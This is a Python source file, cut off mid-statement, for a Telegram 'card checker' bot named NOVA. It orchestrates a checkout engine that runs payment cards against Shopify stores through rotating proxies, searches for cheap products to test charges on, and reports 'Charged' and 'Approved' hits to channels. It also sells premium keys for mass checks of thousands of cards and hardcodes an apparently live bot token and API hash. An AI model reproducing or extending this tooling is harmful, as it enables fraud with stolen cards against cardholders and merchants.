# =============================================================================
# NOVA Bot — v8.1.0 (API-less + auto-search + MongoDB)
# =============================================================================
# Mongo-backed: users, proxies, sites, cards, joined-cache
# JSON-backed:  keys, referrals, streaks, settings, premium-daily, user-limits
# Engine:       direct (no HTTP layer), captcha-aware
# =============================================================================

import os
import re
import json
import time
import random
import string
import hashlib
import logging
import asyncio
import threading
import urllib.parse
import urllib.request
from datetime import datetime, timedelta
from typing import Optional, List
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# ====================== MONGO ======================
from database import (
    init_db, db as mongo_db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user, is_banned_user,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    add_global_site, get_global_sites, remove_global_site,
    get_total_users, get_premium_count, get_total_sites_count,
    get_total_cards_count, get_charged_count, get_approved_count,
    save_card_to_db,
    mark_user_joined, is_user_marked_joined, remove_joined_mark,
)


# ====================== DIRECT ENGINE ======================
try:
    from checkout_engine import (
        run_checkout_for_card,
        normalize_proxy as engine_normalize_proxy,
        parse_card_entry,
        CheckStatus,
    )
    ENGINE_OK = True
    _ENGINE_ERR = None
except Exception as _e:
    ENGINE_OK = False
    _ENGINE_ERR = _e
    run_checkout_for_card = None
    engine_normalize_proxy = None
    parse_card_entry = None

_ENGINE_POOL = ThreadPoolExecutor(max_workers=int(os.getenv("CHECKER_THREADS", "200")),
                                   thread_name_prefix="chk")


# ====================== LOGGING ======================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s',
                          datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt)
log.addHandler(_ch)

if not os.getenv("RAILWAY_ENVIRONMENT"):
    try:
        _fh = logging.FileHandler('nova_bot.log', encoding='utf-8')
        _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt)
        log.addHandler(_fh)
    except Exception:
        pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_MAP = {}
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BOLD_MAP[_c] = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"[_i]
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BOLD_MAP[_c] = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"[_i]
for _i, _c in enumerate("0123456789"):
    _BOLD_MAP[_c] = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

ADMIN_ID_FILE = "admins.json"


def _load_admins():
    global ADMIN_ID
    try:
        if os.path.exists(ADMIN_ID_FILE):
            with open(ADMIN_ID_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                merged = list(dict.fromkeys(
                    list(ADMIN_ID) + [int(x) for x in data if str(x).lstrip('-').isdigit()]
                ))
                ADMIN_ID.clear(); ADMIN_ID.extend(merged)
    except Exception as e:
        log_system("ADMIN", f"load failed: {e}", "warning")


def _save_admins():
    try:
        with open(ADMIN_ID_FILE, "w", encoding="utf-8") as f:
            json.dump(list(ADMIN_ID), f, indent=2)
    except Exception as e:
        log_system("ADMIN", f"save failed: {e}", "warning")


HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1003902938287

FORCE_JOIN_GROUP_ID   = -1003902938287
FORCE_JOIN_CHANNEL_ID = -1004381920430

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"
SEP          = "━━━━━━━━━━━━━━━━━"
PE           = "💎"

PRICE_FLOOR  = float(os.getenv("PRICE_FLOOR", "0.10"))
PRICE_CEIL   = float(os.getenv("PRICE_CEIL",  "7.00"))

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

MASS_HARD_CAP_ADMIN   = 10000
MASS_HARD_CAP_PREMIUM = 5000

KEYS_FILE            = "keys.json"
RANK_FILE            = "rank.json"
SETTINGS_FILE        = "settings.json"
PREMIUM_DAILY_FILE   = "premium_daily.json"
USER_LIMITS_FILE     = "user_daily_limits.json"
REFERRALS_FILE       = "referrals.json"
STREAKS_FILE         = "streaks.json"
SITE_STATS_FILE      = "site_stats.json"
WELCOME_FILE_ID_FILE = os.environ.get("WELCOME_FILE_ID_FILE", ".welcome_file_id.txt")

REFERRAL_MILESTONE_EVERY    = 5
REFERRAL_MILESTONE_HOURS    = 24
REFERRAL_MILESTONE_CC_LIMIT = 5000
REFERRAL_MIN_CHECKS         = 1
REFERRAL_MAX_PER_USER       = 500

STREAK_MIN_GAP_HOURS = 20
STREAK_MAX_GAP_HOURS = 30
STREAK_MILESTONES = {3: 6, 7: 24, 14: 72, 30: 240}

SITE_DISABLE_AFTER_ERRORS  = 10
SITE_MIN_ATTEMPTS_TO_JUDGE = 20
SITE_TOP_PERCENT           = 0.7

SP_PER_USER_WORKERS      = 70
MSP_PER_USER_WORKERS     = 70
SITE_PER_USER_WORKERS    = 70
PROXY_PER_USER_WORKERS   = 70
FETCH_PER_USER_WORKERS   = 20

CHECK_TIMEOUT = float(os.getenv("CHECK_TIMEOUT", "90"))

AUTO_KEYWORDS = [
    "socks", "sticker", "pin", "patch", "keychain", "magnet", "postcard",
    "lip balm", "soap", "scrunchy", "hair tie", "notebook", "pen", "pencil",
    "washi tape", "sticker sheet", "temporary tattoo", "face mask",
    "candle", "bath bomb", "hand sanitizer", "phone grip", "pop socket",
    "enamel pin", "lanyard", "bracelet", "earring", "ring", "necklace",
    "hair clip", "bandana", "coaster", "tote", "pouch", "wallet",
    "air freshener", "seed packet", "herb", "tea sample", "coffee sample",
    "candy", "gum", "chocolate", "cookie", "brownie", "snack",
]


# ====================== PREMIUM EMOJI ======================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🥈":"5042036407137207122","🥉":"5039808285478224750","🥔":"5039928501612839813",
    "🧨":"5039778134807806727","🏆":"6089185885289454318","👑":"5039727497143387500",
    "👤":"5992129361090711368","🤖":"6174896506051495705","⚙️":"5445059250382469069",
    "🌐":"6321225560789877992","ℹ️":"5334544901428229844","🏳️":"5256143829672672750",
    "📍":"5391032818111363540","📡":"5447448489149625830","🔔":"5042111805288089118",
    "🛡":"5042328396193864923","🛡️":"5042328396193864923","🔑":"5399885604701880145",
    "🔒":"5445059250382469069","🔓":"5445373981290952548","🔗":"5042101437237036298",
    "🔐":"5445059250382469069","⏰":"5445350406215465190","⏱️":"5445350406215465190",
    "⏱":"5445350406215465190","⌛":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "💠":"5427168083074628963","🌍":"5447410659077661506","🔰":"5042328396193864923",
    "📧":"5443127283898405358","💀":"5042209657527993345","💯":"5042297717242463211",
    "🚫":"5039671744172917707","😈":"6336664426325740768","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","🟡":"5042036407137207122","🔵":"5042290883949495533",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⏸":"5042036407137207122","▶️":"5039753786638205957","⏹":"5134537521518085000",
    "🧹":"5039751080808809534","📌":"5397782960512444700","📋":"5445260044398524944",
    "🔧":"5445059250382469069","🔍":"5042302287087666158","💻":"5039579582764680065",
    "📩":"5443127283898405358","💬":"5040036030414062506","📢":"5447644880824181073",
    "📣":"5447644880824181073","💡":"5042264341051605743","🛒":"5445224894386172410",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏠":"5416041192905265756",
    "🏙️":"5447410659077661506","📞":"5443127283898405358","📮":"5444889156792646660",
    "🗺️":"6321225560789877992","↪️":"5445365692004071819","🔙":"5445365692004071819",
    "⬅️":"5445365692004071819","➡️":"5445365692004071819","🎀":"5039953030171067177",
    "🎊":"5039778134807806727","🌟":"5042061201983407048","🔀":"5348386034835015762",
    "🎬":"5445355530111437729","🧠":"6174896506051495705","🖥️":"5039579582764680065",
    "💾":"6026239398650056451","💿":"6026239398650056451","🏓":"5042200814190330758",
    "🎁":"5039778134807806727","🎈":"5039778134807806727","🎨":"5039953030171067177",
    "🌸":"5039953030171067177","🍀":"5039928501612839813","🌙":"5042200814190330758",
    "☀️":"5039808285478224750","🌈":"5256143829672672750","👥":"5443038326535759644",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji in sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True):
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# ====================== MESSAGE HELPERS ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
                timeout=10)
        except Exception:
            return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


async def send_entities(chat_id, html_text, buttons=None, file=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=ents,
            buttons=buttons, link_preview=False, **kwargs)
    except Exception as e:
        log_system("SEND", f"{e}", "error")
        return None


async def send_file_entities(chat_id, file, html_caption, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(
            chat_id, file, caption=text, formatting_entities=ents,
            buttons=buttons, **kwargs)
    except Exception as e:
        log_system("SEND_FILE", f"{e}", "error")
        return None


async def edit_entities(msg, html_text, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        await msg.edit(text, formatting_entities=ents,
                       buttons=buttons, link_preview=False, **kwargs)
        return True
    except Exception:
        return False


# ====================== BUTTON HELPER ======================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
    "📢":"5447644880824181073","👥":"5443038326535759644","📩":"5443127283898405358",
    "💬":"5040036030414062506","🥇":"6179279816529814743","🥈":"5042036407137207122",
    "🥉":"5039808285478224750","🥔":"5039928501612839813","🧨":"5039778134807806727",
    "🟢":"5039928501612839813","🔵":"5042290883949495533","🟡":"5042036407137207122",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⛔":"6181277564732972292","🛑":"6181277564732972292","🚨":"5039671744172917707",
    "🎯":"5039905162760553480","📊":"5042290883949495533","📈":"5039808285478224750",
    "🏆":"6089185885289454318","👤":"5992129361090711368","📌":"5397782960512444700",
    "🔍":"5042302287087666158","🔧":"5445059250382469069","💡":"5042264341051605743",
    "📝":"5444889156792646660","🗑":"5039614900280754969","📅":"6168242008277125889",
    "🧹":"5039751080808809534","🎉":"5039778134807806727","✨":"5040016479722931047",
    "✔️":"5206607081334906820","🔒":"5445059250382469069","🔐":"5445059250382469069",
    "🌍":"5447410659077661506","📍":"5391032818111363540","🎬":"5445355530111437729",
    "🎀":"5039953030171067177","🎊":"5039778134807806727","🌟":"5042061201983407048",
    "💯":"5042297717242463211","😈":"6336664426325740768","💀":"5042209657527993345",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏦":"6089185885289454318",
    "💵":"5409048419211682843","💸":"5837027045376271166","💲":"5447579253723918909",
    "⏱️":"5445350406215465190","⏱":"5445350406215465190","⌛":"5445350406215465190",
    "📤":"5445355530111437729","🔗":"5042101437237036298","💠":"5427168083074628963",
    "🔮":"5042302287087666158","🔀":"5348386034835015762",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# ====================== JSON STORAGE (keys/refs/streaks/settings) ======================
def _read_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def _write_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        log_system("FS", f"write {path} failed: {e}", "error")


# ====================== MONGO WRAPPERS ======================
async def is_premium(uid: int) -> bool:
    """Async premium check — admins bypass, Mongo-backed for others."""
    if uid in ADMIN_ID:
        return True
    return await is_premium_user(uid)


async def load_user_proxies_async(uid: int):
    """Return list of raw proxy strings for a user."""
    docs = await get_all_user_proxies(uid)
    out = []
    for d in docs:
        # Prefer explicit ip:port:user:pass form for country-tag preservation
        raw = d.get("proxy_url") or ""
        if not raw:
            ip = d.get("ip"); port = d.get("port")
            u = d.get("username"); pw = d.get("password")
            if u and pw:
                raw = f"{ip}:{port}:{u}:{pw}"
            else:
                raw = f"{ip}:{port}"
        out.append(raw)
    return out


async def load_sites_async():
    """Global sites list from Mongo."""
    try:
        return await get_global_sites()
    except Exception:
        return []


async def save_sites_async(sites_list):
    """Sync a full list into global_sites (add new, remove missing)."""
    try:
        existing = set(await get_global_sites())
        want = set(sites_list)
        for s in want - existing:
            await add_global_site(s)
        for s in existing - want:
            await remove_global_site(s)
    except Exception as e:
        log_system("SITES", f"save failed: {e}", "error")


async def add_sites_bulk(sites_iter):
    """Add multiple sites, deduped at Mongo level."""
    added = 0
    for s in sites_iter:
        if await add_global_site(s):
            added += 1
    return added


async def get_user_cc_limit(uid: int) -> int:
    if uid in ADMIN_ID:
        return 100000
    info = await mongo_db["users"].find_one({"user_id": uid})
    if not info:
        return 0
    plan = info.get("plan", "Bronze")
    if plan not in ["Core", "Elite", "Root", "X"]:
        return 0
    # Use per-user override from user_limits if present
    lim = _read_json(USER_LIMITS_FILE, {})
    if str(uid) in lim:
        try:
            return int(lim[str(uid)])
        except Exception:
            pass
    # Default by plan
    return {"X": 10000, "Root": 5000, "Elite": 2500, "Core": 1500}.get(plan, DEFAULT_KEY_CC_LIMIT)


# ====================== WELCOME FILE_ID CACHE ======================
def get_welcome_file_id():
    if os.path.exists(WELCOME_FILE_ID_FILE):
        try:
            with open(WELCOME_FILE_ID_FILE, "r", encoding="utf-8") as f:
                fid = f.read().strip()
                return fid or None
        except Exception:
            pass
    return None


def set_welcome_file_id(fid):
    try:
        with open(WELCOME_FILE_ID_FILE, "w", encoding="utf-8") as f:
            f.write(fid)
    except Exception:
        pass


# ====================== SITE STATS (JSON) ======================
_SITE_STATS_LOCK = threading.Lock()


def load_site_stats():
    return _read_json(SITE_STATS_FILE, {})


def save_site_stats(d):
    _write_json(SITE_STATS_FILE, d)


def _site_report(site, status):
    if not site:
        return
    try:
        with _SITE_STATS_LOCK:
            d = load_site_stats()
            s = d.get(site) or {"attempts": 0, "hits": 0, "declined": 0,
                                "errors": 0, "last_used": 0, "disabled": False}
            s["attempts"] = int(s.get("attempts", 0)) + 1
            s["last_used"] = time.time()
            if status in ("Charged", "Approved"):
                s["hits"] = int(s.get("hits", 0)) + 1; s["errors"] = 0
            elif status == "Dead":
                s["declined"] = int(s.get("declined", 0)) + 1
            else:
                s["errors"] = int(s.get("errors", 0)) + 1
            if s["attempts"] >= SITE_MIN_ATTEMPTS_TO_JUDGE:
                if s["hits"] == 0 and s["errors"] >= SITE_DISABLE_AFTER_ERRORS:
                    s["disabled"] = True
            d[site] = s
            save_site_stats(d)
    except Exception:
        pass


def _site_score(site):
    d = load_site_stats()
    s = d.get(site)
    if not s:
        return 1.0
    if s.get("disabled"):
        return -1.0
    a = max(1, int(s.get("attempts", 1)))
    h = int(s.get("hits", 0))
    e = int(s.get("errors", 0))
    return (h / a) - min(0.5, e * 0.05)


def _get_active_sites(all_sites):
    if not all_sites:
        return []
    d = load_site_stats()
    scored = []
    for s in all_sites:
        info = d.get(s) or {}
        if info.get("disabled"):
            continue
        scored.append((s, _site_score(s)))
    if not scored:
        for s in all_sites:
            if s in d:
                d[s]["disabled"] = False; d[s]["errors"] = 0
        save_site_stats(d)
        return all_sites
    scored.sort(key=lambda x: x[1], reverse=True)
    top_n = max(1, int(len(scored) * SITE_TOP_PERCENT))
    top = [s for s, _ in scored[:top_n]]
    bottom = [s for s, _ in scored[top_n:]]
    random.shuffle(top); random.shuffle(bottom)
    return top + bottom


# ====================== KEYS ======================
def load_keys():
    return _read_json(KEYS_FILE, {})


def save_keys(keys):
    _write_json(KEYS_FILE, keys)


def generate_key():
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


# ====================== RANK ======================
def load_rank():
    return _read_json(RANK_FILE, {})


def save_rank(data):
    _write_json(RANK_FILE, data)


def increment_charge_count(user_id):
    data = load_rank()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + 1
    save_rank(data)


def count_successful_checks(user_id):
    rank = load_rank()
    try:
        return int(rank.get(str(user_id), 0))
    except Exception:
        return 0


# ====================== SETTINGS ======================
def load_settings():
    return _read_json(SETTINGS_FILE, {"maintenance": False,
                                      "threshold": PRICE_CEIL,
                                      "min_price": PRICE_FLOOR})


def save_settings(data):
    _write_json(SETTINGS_FILE, data)


_MAINT_CACHE = {"v": False, "ts": 0.0}


def get_maintenance():
    now = time.time()
    if now - _MAINT_CACHE["ts"] < 30:
        return _MAINT_CACHE["v"]
    v = bool(load_settings().get("maintenance", False))
    _MAINT_CACHE["v"] = v; _MAINT_CACHE["ts"] = now
    return v


def set_maintenance(enabled):
    s = load_settings(); s["maintenance"] = bool(enabled); save_settings(s)
    _MAINT_CACHE["v"] = bool(enabled); _MAINT_CACHE["ts"] = time.time()


def get_threshold():
    return float(load_settings().get("threshold", PRICE_CEIL))


def set_threshold(val):
    s = load_settings(); s["threshold"] = float(val); save_settings(s)


def get_min_price():
    return float(load_settings().get("min_price", PRICE_FLOOR))


def set_min_price(val):
    s = load_settings(); s["min_price"] = float(val); save_settings(s)


# ====================== FORCE JOIN ======================
FORCE_JOIN_CHATS = [
    (FORCE_JOIN_GROUP_ID,   "Group",   GROUP_INVITE_LINK),
    (FORCE_JOIN_CHANNEL_ID, "Channel", CHANNEL_INVITE_LINK),
]

_JOIN_CACHE = {}
_JOIN_CACHE_TTL = 600


async def _is_in_chat(user_id, chat_id):
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (UserNotParticipantError, ChannelPrivateError,
                                  ChatAdminRequiredError, UserIdInvalidError)
    if not chat_id:
        return None
    try:
        await client_instance(GetParticipantRequest(channel=chat_id, participant=user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChannelPrivateError, ChatAdminRequiredError):
        log_system("FORCE_JOIN", f"cannot verify chat {chat_id}", "warning")
        return None
    except UserIdInvalidError:
        return False
    except Exception as e:
        log_system("FORCE_JOIN", f"err {chat_id}: {e!r}", "warning")
        return None


async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    ca = _JOIN_CACHE.get(user_id)
    if ca and now - ca < _JOIN_CACHE_TTL:
        return True
    results = await asyncio.gather(
        _is_in_chat(user_id, FORCE_JOIN_CHATS[0][0]),
        _is_in_chat(user_id, FORCE_JOIN_CHATS[1][0]),
        return_exceptions=True)
    for r in results:
        if r is False:
            return False
    _JOIN_CACHE[user_id] = now
    return True


async def send_join_required_message(event):
    rows = []
    for _cid, name, link in FORCE_JOIN_CHATS:
        if link:
            rows.append([pbtn(bs(f"📢 Join {name}"), url=link,
                              style="primary", icon="📢")])
    rows.append([pbtn(bs("✅ I Joined"), data="check_joined",
                      style="success", icon="✅")])
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
💎 {bs('Join both chats to continue')}
{SEP}""")
    await styled_reply(event, text, buttons=rows)


async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    await send_join_required_message(event)
    return False


async def check_maintenance(event):
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
💎 <b>{bs('Bot under maintenance')}</b>
💎 <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
💎 {bs('This command requires premium access')}
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
        buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                       style="success", icon="📩")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
💎 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# ====================== CLIENT ======================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


# ====================== FREE TIER TRACKER ======================
_FREE_USAGE = {}
_FREE_LAST = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id):
    last = _FREE_LAST.get(user_id, 0)
    el = time.time() - last
    if el >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - el, 1)


def set_free_last(user_id):
    _FREE_LAST[user_id] = time.time()


# ====================== PREMIUM DAILY ======================
def load_premium_daily():
    return _read_json(PREMIUM_DAILY_FILE, {})


def save_premium_daily(d):
    _write_json(PREMIUM_DAILY_FILE, d)


def get_premium_daily_used(uid):
    d = load_premium_daily()
    e = d.get(str(uid), {})
    if e.get("date") != datetime.now().strftime("%Y-%m-%d"):
        return 0
    return e.get("count", 0)


def inc_premium_daily_used(uid):
    d = load_premium_daily()
    u = str(uid); today = datetime.now().strftime("%Y-%m-%d")
    e = d.get(u, {})
    if e.get("date") != today:
        e = {"date": today, "count": 1}
    else:
        e["count"] = e.get("count", 0) + 1
    d[u] = e; save_premium_daily(d)


def get_premium_daily_limit(uid):
    lim = _read_json(USER_LIMITS_FILE, {})
    return int(lim.get(str(uid), 0))


# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
BOT_START_TIME = time.time()


# ====================== VIDEO SYSTEM ======================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# ====================== AUTO SHOPIFY SEARCH (shop.app) ======================
_SEARCH_ENDPOINTS = [
    "https://shop.app/agents/search",
    "https://shop.app/web/api/catalog/search",
]


def _parse_shop_markdown(text):
    if not text or not isinstance(text, str):
        return []
    if text.strip().startswith("# Error"):
        return []
    blocks = re.split(r"\n\s*---\s*\n", text)
    out = []
    for block in blocks:
        lines = [l.strip() for l in block.split("\n") if l.strip()]
        if len(lines) < 2:
            continue
        title = lines[0]
        if title.startswith("#"):
            continue
        m = re.search(r"\$\s*([\d.,]+)", lines[1])
        if not m:
            continue
        try:
            price = float(m.group(1).replace(",", ""))
        except Exception:
            continue
        if not (PRICE_FLOOR <= price <= PRICE_CEIL):
            continue
        product_url = checkout_tpl = ""
        for l in lines:
            if not product_url and re.match(r"^https?://", l, re.I) \
                    and not re.match(r"^img:", l, re.I) \
                    and not re.match(r"^checkout:", l, re.I) \
                    and "/cart/" not in l:
                product_url = l
            if not checkout_tpl and re.match(r"^checkout:\s*", l, re.I):
                checkout_tpl = re.sub(r"^checkout:\s*", "", l, flags=re.I).strip()
        vid = ""
        if product_url:
            vm = re.search(r"[?&]variant=(\d+)", product_url)
            if vm:
                vid = vm.group(1)
        if not vid:
            vm = re.search(r"\((\d{6,})\)", block)
            if vm:
                vid = vm.group(1)
        checkout = checkout_tpl.replace("{id}", vid).replace("{ID}", vid)
        if not checkout and product_url and vid:
            try:
                p = urllib.parse.urlparse(product_url)
                checkout = f"{p.scheme}://{p.netloc}/cart/{vid}:1"
            except Exception:
                pass
        try:
            p = urllib.parse.urlparse(product_url)
            site = f"{p.scheme}://{p.netloc}" if p.scheme and p.netloc else ""
        except Exception:
            site = ""
        if not site:
            continue
        out.append({"site": site, "variant_id": vid or "",
                    "price": price, "title": title[:120],
                    "checkout": checkout})
    return out


def _shop_search_once(keyword):
    for base in _SEARCH_ENDPOINTS:
        url = (f"{base}?query={urllib.parse.quote(keyword)}&limit=20"
               f"&ships_to=US&available_for_sale=1"
               f"&min_price={PRICE_FLOOR:.2f}&max_price={PRICE_CEIL:.2f}")
        try:
            req = urllib.request.Request(url, headers={
